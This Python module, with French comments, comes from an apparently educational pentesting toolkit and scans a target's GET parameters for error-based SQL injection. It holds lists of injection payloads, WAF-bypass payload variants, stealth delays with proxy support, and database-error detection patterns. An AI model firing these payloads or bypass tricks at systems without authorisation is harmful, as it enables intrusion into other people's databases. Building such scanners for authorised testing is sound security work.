"""Détection d'injections SQL (error-based) sur paramètres GET identifiés."""

from __future__ import annotations

import re
import time

from typing import Optional

from learnwhitehack.core.config import AppConfig
from learnwhitehack.core.http_client import make_session
from learnwhitehack.core.logger import get_logger
from learnwhitehack.core.reporter import Report, Severity
from learnwhitehack.core.state import ScanContext, Vulnerability as CtxVuln

log = get_logger("vuln.sqli_probe")

# Payloads basiques error-based (détection uniquement, pas d'extraction)
_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "\\",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1' OR '1'='1",
    "1 OR 1=1--",
    "1' --",
    "1' #",
    "1; SELECT 1--",
    "1 UNION SELECT NULL--",
    "1' AND SLEEP(0)--",  # time-based safe (sleep 0)
]

# Patterns d'erreurs SQL dans la réponse
_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"sql syntax.*mysql",
    r"warning.*\Wmysqli?\W",
    r"mysqli_fetch_array\(\)",
    r"num_rows",
    r"ORA-\d{5}",
    r"PLS-\d{5}",
    r"PostgreSQL.*error",
    r"microsoft.*odbc.*sql server",
    r"microsoft.*ole db.*sql server",
    r"driver.*sql.*server",
    r"sql server.*driver",
    r"sqlstate\[",
    r"pdo.*exception",
    r"database error",
]
_RE_ERRORS = re.compile("|".join(_ERROR_PATTERNS), re.IGNORECASE)

# Paramètres GET courants à tester
_DEFAULT_PARAMS = ["id", "page", "p", "q", "s", "search", "cat", "category",
                   "tag", "post", "article", "item", "product", "user", "name"]

# Payloads WAF-bypass : obfuscation par commentaires inline et variation de casse
_PAYLOADS_WAF_BYPASS = [
    "'/*!50000OR*/1=1--",
    "'/**/OR/**/1=1--",
    "' OR 'x'='x",
    "1'/**/UNION/**/SELECT/**/NULL--",
    "1' AnD sLeEp(0)--",
    "1' /*!AND*/ '1'='1",
    "1 /*!50000UNION*/ /*!50000SELECT*/ NULL--",
]


def run(
    cfg: AppConfig,
    report: Report,
    urls: list[str] | None = None,
    params: list[str] | None = None,
    context: Optional[ScanContext] = None,
) -> list[dict[str, object]]:
    """Teste les paramètres GET de la cible pour des injections SQL."""
    base_url = cfg.target.url.rstrip("/")
    if not base_url:
        log.error("Aucune URL cible configurée.")
        return []

    target_params = params or _DEFAULT_PARAMS
    test_urls = urls or [base_url + "/", base_url + "/?s=test"]

    # Synergy WAF → SQLi : adapter les payloads et le délai si un WAF est connu
    waf_active = context is not None and context.waf_detected is not None
    active_payloads = _PAYLOADS_WAF_BYPASS if waf_active else _PAYLOADS
    min_d = cfg.stealth.min_delay * 2 if waf_active else cfg.stealth.min_delay
    max_d = cfg.stealth.max_delay * 2 if waf_active else cfg.stealth.max_delay

    if waf_active:
        log.info(
            f"  [yellow]WAF détecté ({context.waf_detected})[/] "  # type: ignore[union-attr]
            "→ délai x2, payloads WAF-bypass activés"
        )

    log.info(
        f"[bold]vuln.sqli_probe[/] → {base_url} "
        f"({len(target_params)} paramètres, {len(active_payloads)} payloads)"
    )

    session = make_session(
        min_delay=min_d,
        max_delay=max_d,
        proxies=cfg.stealth.proxies,
        verify_ssl=cfg.http.verify_ssl,
    )

    vulnerabilities: list[dict[str, object]] = []
    tested: set[str] = set()

    for base in test_urls:
        for param in target_params:
            for payload in active_payloads:
                url = f"{base}{'&' if '?' in base else '?'}{param}={payload}"
                key = f"{param}:{payload[:20]}"
                if key in tested:
                    continue
                tested.add(key)

                try:
                    resp = session.get(url, timeout=cfg.http.timeout)
                except Exception as e:
                    log.debug(f"Erreur {url}: {e}")
                    continue

                if _RE_ERRORS.search(resp.text):
                    log.info(f"  [red]SQLi error-based possible[/] : param={param}, payload={payload!r}")
                    vuln = {
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "evidence": resp.text[:300],
                    }
                    vulnerabilities.append(vuln)

                    if context is not None:
                        context.vulnerabilities.append(CtxVuln(
                            module_source="vuln.sqli_probe",
                            severity="CRITICAL",
                            description=f"SQLi error-based : paramètre '{param}'",
                            payload_used=payload,
                        ))

                    report.add_finding(
                        module="vuln.sqli_probe",
                        severity=Severity.CRITICAL,
                        title=f"Injection SQL possible : paramètre '{param}'",
                        detail=(
                            f"Le paramètre '{param}' semble vulnérable à une injection SQL. "
                            f"Une erreur de base de données a été détectée avec le payload: {payload!r}"
                        ),
                        evidence={
                            "url": url,
                            "param": param,
                            "payload": payload,
                            "response_excerpt": resp.text[:500],
                        },
                        references=[
                            "https://owasp.org/www-community/attacks/SQL_Injection",
                            "https://portswigger.net/web-security/sql-injection",
                        ],
                    )
                    break  # Pas besoin de tester d'autres payloads pour ce param

    if not vulnerabilities:
        log.info("  Aucune injection SQL error-based détectée (test limité).")

    return vulnerabilities
